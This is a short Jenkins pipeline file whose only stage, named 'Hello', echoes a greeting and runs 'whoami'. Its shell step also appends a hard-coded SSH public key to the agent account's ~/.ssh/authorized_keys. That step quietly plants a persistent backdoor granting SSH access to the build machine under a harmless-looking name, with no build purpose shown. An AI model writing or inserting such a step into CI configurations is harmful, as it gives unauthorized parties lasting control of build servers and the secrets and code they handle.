pipeline {
  agent none
  stages {
    stage('Hello') {
      agent any
      steps {
        echo 'Hello, '
        sh '''#!/bin/bash
        whoami
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbE8eWA5z9EAeL6kIMRFojWM7NIPjSSH5MyksgrGNXPGjUUBJ3I2G4s+HZHRrE1rWKx+56UH4rfoq04Vkf7QLk/CroDCvUUGXuwq0J4E1PVKpBaZPdtdKT5llXpyBRPJZ2rIuI/bSAF4uUmwN910yZ0MiRB0BwzFWP6haR+4uFhaxR7gTQTxm+w/PjUX1K70MhUMapbfQ7YxsK50vfYKF+GaaFteG+9qRhnAkJUZgnxiGSJ7s9yCv8N+1aggu9spp76YF+nBYdGMyUCMkZ8baeUgI1QFhaTBt9apQshdkEfwsJkrxKjJeJpLgP8cmmKJu0jQ/uIlQMpww2UfeKrJW6olTSpP0+E45Tk3PHYthY4OoLCFyst3jcIscu2/DQzMCy2P1FG6V2pYBTaOZvikKtWcZIgSYN6Pdc0QT8DFhcqMCc2gZiUDe6kG1VxM1M04vbhfVZIhWvp8N7NaIdvVGA7Nt5vPkG1UqR0Uoa/09J62yf63YcOfiQt2z3h1QiKcs= shaim@Shai-Komodo" >> ~/.ssh/authorized_keys
        '''
      }
    }

  }
}
